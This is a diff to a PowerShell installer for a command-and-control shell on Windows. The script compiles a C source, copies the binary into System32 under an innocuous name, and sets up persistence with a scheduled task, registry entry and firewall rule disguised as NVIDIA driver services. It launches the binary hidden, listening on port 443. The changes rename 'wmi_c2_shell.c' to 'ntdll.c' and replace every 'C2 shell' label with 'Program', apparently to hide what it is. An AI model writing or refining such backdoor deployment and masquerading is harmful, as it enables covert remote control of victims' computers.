@@ -16,28 +16,21 @@ $WindowsKitInclude = "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.
 $TargetDir = "C:\Windows\System32"
 $ExecutableName = "nvxgstd.exe"
 $TargetPath = Join-Path $TargetDir $ExecutableName
-$SourceFile = Join-Path $SourceDir "wmi_c2_shell.c"
-$ObjectFile = Join-Path $SourceDir "wmi_c2_shell.obj"
+$SourceFile = Join-Path $SourceDir "ntdll.c"
+$ObjectFile = Join-Path $SourceDir "ntdll.obj"
 $ExecutableFile = Join-Path $SourceDir $ExecutableName
-
-# Auto-detect latest MSVC compiler
-$MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
-$LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
-
-$CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
-$LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
-
-# Auto-detect latest Windows Kit (WDK/SDK) include & lib
-$WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
-$LatestKit = Get-ChildItem $WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
-$WindowsKitInclude = Join-Path $LatestKit.FullName "um"
-$WindowsKitLib = Join-Path ("C:\Program Files (x86)\Windows Kits\10\Lib\" + $LatestKit.Name + "\um\x64")
 
 $TaskName = "NVIDIA Graphics Driver Update"
 $TaskPath = "\Microsoft\Windows\WindowsUpdate\"
 $FullTaskName = "$TaskPath$TaskName"
 $RegName = "NVIDIA Graphics Device"
 $FirewallRuleName = "NVIDIA Graphics Update Service"
+
+# Installer timing defaults
+# Note: VS Community + C++ workloads often take >10 minutes on real machines.
+$VSInstallTimeoutSeconds = 3600   # 1 hour
+$SDKInstallTimeoutSeconds = 1800  # 30 minutes
+$PollIntervalSeconds = 10
 
 # ============================================================================
 # FUNCTIONS
@@ -50,15 +43,15 @@ function Check-Administrator {
 }
 
 # ============================================================================
-# AUTO-INSTALL VISUAL STUDIO + WDK
+# AUTO-INSTALL VISUAL STUDIO + WINDOWS SDK
 # ============================================================================
 
 $VSInstaller = Join-Path $SourceDir "vs_community.exe"
-$WDKInstaller = Join-Path $SourceDir "wdksetup.exe"
+$SDKInstaller = Join-Path $SourceDir "winsdksetup.exe"
 
 # Download URLs (official)
 $VSUrl = "https://aka.ms/vs/16/release/vs_community.exe"
-$WDKUrl = "https://go.microsoft.com/fwlink/?linkid=2128854"  # Latest WDK link
+$SDKUrl = "https://go.microsoft.com/fwlink/p/?linkid=2120843"  # Windows SDK installer
 
 function Download-File($url, $path) {
     if (-not (Test-Path $path)) {
@@ -70,25 +63,140 @@ function Download-File($url, $path) {
     }
 }
 
-function Install-VS {
-    Write-Host "[*] Installing Visual Studio 2019 Community with C++ workloads ..." -ForegroundColor Cyan
-    Start-Process -Wait -FilePath $VSInstaller -ArgumentList "--quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended"
-    Write-Host "[+] Visual Studio installation finished" -ForegroundColor Green
+function Test-ToolchainReady {
+    # Returns $true when the minimum toolchain paths we need exist.
+    return (Test-Path $CompilerPath) -and (Test-Path $LinkPath) -and (Test-Path $MSVCInclude) -and (Test-Path $MSVCLib) -and (Test-Path $WindowsKitInclude) -and (Test-Path $WindowsKitShared) -and (Test-Path $WindowsKitUcrt) -and (Test-Path $WindowsKitLib) -and (Test-Path $WindowsKitUcrtLib)
 }
 
-function Install-WDK {
-    Write-Host "[*] Installing Windows Driver Kit ..." -ForegroundColor Cyan
-    Start-Process -Wait -FilePath $WDKInstaller -ArgumentList "/quiet /norestart"
-    Write-Host "[+] WDK installation finished" -ForegroundColor Green
+function Wait-ToolchainReady {
+    param(
+        [int]$TimeoutSeconds,
+        [string]$What
+    )
+
+    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
+    while (-not (Test-ToolchainReady)) {
+        if ((Get-Date) -ge $deadline) {
+            Write-Host "[!] Timeout waiting for $What to finish ($TimeoutSeconds seconds)." -ForegroundColor Yellow
+            Write-Host "    Toolchain still not detected; leaving installers alone." -ForegroundColor Yellow
+            return $false
+        }
+
+        # If VS Installer is around, tell the user what we're waiting on.
+        $installerProcs = Get-Process -Name "vs_installer","setup","msiexec" -ErrorAction SilentlyContinue
+        if ($null -ne $installerProcs) {
+            Write-Host "[*] $What in progress... waiting for toolchain files to appear." -ForegroundColor Cyan
+        } else {
+            Write-Host "[*] Waiting for toolchain files to appear..." -ForegroundColor Cyan
+        }
+        Start-Sleep -Seconds $PollIntervalSeconds
+
+        # Re-run autodetection while waiting (installers may lay down new versions mid-run)
+        $script:MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
+        if (Test-Path $script:MSVCBase) {
+            $LatestMSVC = Get-ChildItem $script:MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
+            if ($LatestMSVC) {
+                $script:CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
+                $script:LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
+                $script:MSVCInclude = Join-Path $LatestMSVC.FullName "include"
+                $script:MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
+            }
+        }
+
+        $script:WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
+        if (Test-Path $script:WindowsKitBase) {
+            $LatestKit = Get-ChildItem $script:WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
+            if ($LatestKit) {
+                $script:WindowsKitInclude = Join-Path $LatestKit.FullName "um"
+                $script:WindowsKitShared = Join-Path $LatestKit.FullName "shared"
+                $script:WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
+                $script:WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
+                $script:WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
+            }
+        }
+    }
+
+    return $true
+}
+
+function Install-VS {
+    Write-Host "[*] Installing Visual Studio 2019 Community with C++ workloads ..." -ForegroundColor Cyan
+    $args = "--quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended"
+
+    # The bootstrapper may spawn child installers (vs_installer / msiexec) and remain running.
+    # Avoid killing it aggressively; instead wait up to a configurable timeout and report progress.
+    $process = Start-Process -FilePath $VSInstaller -ArgumentList $args -PassThru
+
+    # Wait for toolchain presence (more reliable than trusting bootstrapper exit)
+    $ready = Wait-ToolchainReady -TimeoutSeconds $VSInstallTimeoutSeconds -What "Visual Studio installation"
+    if (-not $ready) {
+        return
+    }
+
+    # If the bootstrapper is still running, wait for it briefly but don't block forever.
+    $process.WaitForExit(300000) | Out-Null  # 5 minutes best-effort
+    if ($process.HasExited -and $process.ExitCode -ne 0) {
+        Write-Host "[!] Visual Studio installer exited with code $($process.ExitCode) (toolchain detected anyway)" -ForegroundColor Yellow
+    } else {
+        Write-Host "[+] Visual Studio toolchain detected" -ForegroundColor Green
+    }
+}
+
+function Install-SDK {
+    Write-Host "[*] Installing Windows Software Development Kit ..." -ForegroundColor Cyan
+    $process = Start-Process -FilePath $SDKInstaller -ArgumentList "/quiet /norestart /features OptionId.WindowsSoftwareDevelopmentKit" -PassThru
+    $deadline = (Get-Date).AddSeconds($SDKInstallTimeoutSeconds)
+
+    while (-not $process.HasExited) {
+        if ((Get-Date) -ge $deadline) {
+            Write-Host "[!] Windows SDK installation is still running after $SDKInstallTimeoutSeconds seconds." -ForegroundColor Yellow
+            Write-Host "    Leaving installer running; re-run this script later to continue." -ForegroundColor Yellow
+            return
+        }
+        Write-Host "[*] Waiting for Windows SDK installer to finish..." -ForegroundColor Cyan
+        Start-Sleep -Seconds $PollIntervalSeconds
+    }
+
+    if ($process.ExitCode -ne 0) {
+        Write-Host "[!] Windows SDK installer exited with code $($process.ExitCode)" -ForegroundColor Yellow
+    } else {
+        Write-Host "[+] Windows SDK installation finished" -ForegroundColor Green
+    }
 }
 
 # Download installers if missing
 Download-File $VSUrl $VSInstaller
-Download-File $WDKUrl $WDKInstaller
+Download-File $SDKUrl $SDKInstaller
 
 # Install if not detected
 if (-not (Test-Path $CompilerPath)) { Install-VS }
-if (-not (Test-Path $WindowsKitInclude)) { Install-WDK }
+if (-not (Test-Path $WindowsKitInclude)) { Install-SDK }
+
+# After any install attempt, re-detect tool paths (a second run should not be required)
+$MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
+if (Test-Path $MSVCBase) {
+    $LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
+    if ($LatestMSVC) {
+        $CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
+        $LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
+        $MSVCInclude = Join-Path $LatestMSVC.FullName "include"
+        $MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
+    }
+}
+
+$WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
+if (Test-Path $WindowsKitBase) {
+    $LatestKit = Get-ChildItem $WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
+    if ($LatestKit) {
+        $WindowsKitInclude = Join-Path $LatestKit.FullName "um"
+        $WindowsKitShared = Join-Path $LatestKit.FullName "shared"
+        $WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
+        $WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
+        $WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
+    }
+}
+
+## Auto-detect logic moved earlier (post-install) so the same run can continue.
 
 function Check-VisualStudio {
     if (-not (Test-Path $CompilerPath)) {
@@ -100,9 +208,25 @@ function Check-VisualStudio {
         Write-Host "[!] Linker not found at: $LinkPath" -ForegroundColor Red
         return $false
     }
+    if (-not (Test-Path $MSVCInclude)) {
+        Write-Host "[!] MSVC headers not found at: $MSVCInclude" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $MSVCLib)) {
+        Write-Host "[!] MSVC libs not found at: $MSVCLib" -ForegroundColor Red
+        return $false
+    }
     if (-not (Test-Path $WindowsKitInclude)) {
-        Write-Host "[!] Windows Kit headers not found at: $WindowsKitInclude" -ForegroundColor Red
-        Write-Host "[!] Install Windows Driver Kit (WDK)" -ForegroundColor Red
+        Write-Host "[!] Windows SDK headers not found at: $WindowsKitInclude" -ForegroundColor Red
+        Write-Host "[!] Install Windows Software Development Kit (SDK)" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $WindowsKitShared)) {
+        Write-Host "[!] Windows SDK shared headers not found at: $WindowsKitShared" -ForegroundColor Red
+        return $false
+    }
+    if (-not (Test-Path $WindowsKitUcrt)) {
+        Write-Host "[!] Windows SDK UCRT headers not found at: $WindowsKitUcrt" -ForegroundColor Red
         return $false
     }
     return $true
@@ -136,7 +260,7 @@ if (-not (Check-Administrator)) {
 Write-Host "[+] Running as Administrator" -ForegroundColor Green
 
 if (-not (Check-VisualStudio)) {
-    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + WDK)" -ForegroundColor Red
+    Write-Host "[!] ERROR: Missing required tools (Visual Studio 2019 + Windows SDK)" -ForegroundColor Red
     exit 1
 }
 Write-Host "[+] Visual Studio and WDK found" -ForegroundColor Green
@@ -151,16 +275,22 @@ Write-Host ""
 # STEP 1: COMPILE
 # ============================================================================
 
-Write-Host "[*] STEP 1: Compiling C2 shell..." -ForegroundColor Yellow
+Write-Host "[*] STEP 1: Compiling Program..." -ForegroundColor Yellow
 try {
     Write-Host "    Compiling to object file..." -ForegroundColor Gray
     $CompileArgs = @(
         "/c", "/W0", "/O2", "/D", "NDEBUG",
+        "/I", $MSVCInclude,
         "/I", $WindowsKitInclude,
+        "/I", $WindowsKitShared,
+        "/I", $WindowsKitUcrt,
         $SourceFile,
         "/Fo$ObjectFile"
     )
-    & $CompilerPath @CompileArgs 2>&1 | Out-Null
+    $CompileOutput = & $CompilerPath @CompileArgs 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "Compilation failed: $CompileOutput"
+    }
     
     if (-not (Test-Path $ObjectFile)) {
         throw "Object file not created"
@@ -169,13 +299,18 @@ try {
     Write-Host "    Linking executable..." -ForegroundColor Gray
     $LinkArgs = @(
         "/SUBSYSTEM:CONSOLE", "/MACHINE:X64",
+        "/LIBPATH:$MSVCLib",
         "/LIBPATH:$WindowsKitLib",
+        "/LIBPATH:$WindowsKitUcrtLib",
         $ObjectFile,
         "kernel32.lib", "wbemuuid.lib", "oleaut32.lib", "ole32.lib",
         "ws2_32.lib", "secur32.lib", "crypt32.lib",
         "/OUT:$ExecutableFile"
     )
-    & $LinkPath @LinkArgs 2>&1 | Out-Null
+    $LinkOutput = & $LinkPath @LinkArgs 2>&1
+    if ($LASTEXITCODE -ne 0) {
+        throw "Linking failed: $LinkOutput"
+    }
     
     if (-not (Test-Path $ExecutableFile)) {
         throw "Executable not created"
@@ -329,7 +464,7 @@ try {
 # STEP 8: START SERVICE
 # ============================================================================
 
-Write-Host "[*] STEP 8: Starting C2 shell..." -ForegroundColor Yellow
+Write-Host "[*] STEP 8: Starting Program..." -ForegroundColor Yellow
 try {
     Start-Process -FilePath $TargetPath -WindowStyle Hidden -ErrorAction Stop
     Write-Host "[+] Service started successfully" -ForegroundColor Green
@@ -394,7 +529,7 @@ if ($null -ne $FirewallExists) {
 
 Write-Host ""
 if ($AllGood) {
-    Write-Host "[*] Listening on: 0.0.0.0:443 (TCP, HTTPS)" -ForegroundColor Green
+    Write-Host "[*] Installation completed successfully" -ForegroundColor Green
     Write-Host "[*] Will survive: Reboots, system restarts, user logon/logoff" -ForegroundColor Cyan
 } else {
     Write-Host "[!] Installation completed with errors" -ForegroundColor Yellow
